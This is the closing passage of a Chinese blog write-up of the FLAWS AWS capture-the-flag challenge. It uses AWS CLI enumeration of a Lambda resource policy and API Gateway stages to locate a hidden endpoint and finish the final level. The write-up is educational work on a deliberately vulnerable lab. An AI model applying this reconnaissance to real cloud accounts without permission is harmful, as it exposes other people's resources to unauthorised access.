    <span class="token string">"Policy"</span><span class="token builtin class-name">:</span> <span class="token string">"&#123;<span class="token entity" title="\&quot;">\"</span>Version<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>2012-10-17<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Id<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>default<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Statement<span class="token entity" title="\&quot;">\"</span>:[&#123;<span class="token entity" title="\&quot;">\"</span>Sid<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>904610a93f593b76ad66ed6ed82c0a8b<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Effect<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>Allow<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Principal<span class="token entity" title="\&quot;">\"</span>:&#123;<span class="token entity" title="\&quot;">\"</span>Service<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>apigateway.amazonaws.com<span class="token entity" title="\&quot;">\"</span>&#125;,<span class="token entity" title="\&quot;">\"</span>Action<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>lambda:InvokeFunction<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Resource<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>arn:aws:lambda:us-west-2:975426262029:function:Level6<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Condition<span class="token entity" title="\&quot;">\"</span>:&#123;<span class="token entity" title="\&quot;">\"</span>ArnLike<span class="token entity" title="\&quot;">\"</span>:&#123;<span class="token entity" title="\&quot;">\"</span>AWS:SourceArn<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6<span class="token entity" title="\&quot;">\"</span>&#125;&#125;&#125;]&#125;"</span>,
    <span class="token string">"RevisionId"</span><span class="token builtin class-name">:</span> <span class="token string">"22f08307-9080-4403-bf4d-481ddc8dcb89"</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>发现<code>arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\</code>这样一串有趣的资源信息，其中<code>s33ppypa75</code>为<code>rest-api-id</code>，利用这个信息，进一步查看，得到<code>&quot;stageName&quot;: &quot;Prod&quot;</code>：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile flawslevel6 --region us-west-2 apigateway get-stages --rest-api-id <span class="token string">"s33ppypa75"</span>
<span class="token punctuation">&#123;</span>
    <span class="token string">"item"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string">"tracingEnabled"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"stageName"</span><span class="token builtin class-name">:</span> <span class="token string">"Prod"</span>,
            <span class="token string">"cacheClusterEnabled"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"cacheClusterStatus"</span><span class="token builtin class-name">:</span> <span class="token string">"NOT_AVAILABLE"</span>,
            <span class="token string">"deploymentId"</span><span class="token builtin class-name">:</span> <span class="token string">"8gppiv"</span>,
            <span class="token string">"lastUpdatedDate"</span><span class="token builtin class-name">:</span> <span class="token number">1488155168</span>,
            <span class="token string">"createdDate"</span><span class="token builtin class-name">:</span> <span class="token number">1488155168</span>,
            <span class="token string">"methodSettings"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>根据AWS的资源端点规则：<code>https://&lt;rest-api-id&gt;.execute-api.&lt;region&gt;.amazonaws.com/&lt;stage-name&gt;/&lt;lambda function&gt;</code>，可以得到最终的资源点位于：<a target="_blank" rel="noopener" href="https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6">https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6</a> 。在浏览器中访问地址，返回一串文字：</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">&quot;Go to http:&#x2F;&#x2F;theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud&#x2F;d730aa2b&#x2F;</code></pre>

<p>访问给出的网址，成功通关level 6，至此多有挑战全部通关完成：</p>
<p><img src="https://p2.ssl.qhimg.com/t01e05395f18458bd2d.png" srcset="/img/loading.gif"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过FLAWS的挑战，对涉及到AWS的有关漏洞进行了实践学习，从安全运维人员的角度，可以避免踩坑，配置合理的内容和权限，从漏洞发现挖掘的角度，可以在漏洞发现过程中，尝试可能存在的隐患点、漏洞点，说不定有意外之喜。</p>
<p>作为一个小白，这篇FLAWS通关记，是为了记录和分享自己的学习过程，分析记录的不到位的地方，还请大佬们收下留情 =）</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/tags/aws/">aws</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/09/22/Hack-the-box-Sniper/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Hack the box: Sniper</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2019/10/02/google_ctf_2019_stage1_writeup_3/">
                        <span class="hidden-mobile">goolge ctf 2019 stage1 writeup_part_3</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            Page View 
            <span id="busuanzi_value_site_pv"></span>
             
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            Unique Visitor 
            <span id="busuanzi_value_site_uv"></span>
             
          </span>
      
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  
    
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "FLAWS challenge&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>




















<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":170,"height":340},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
</html>
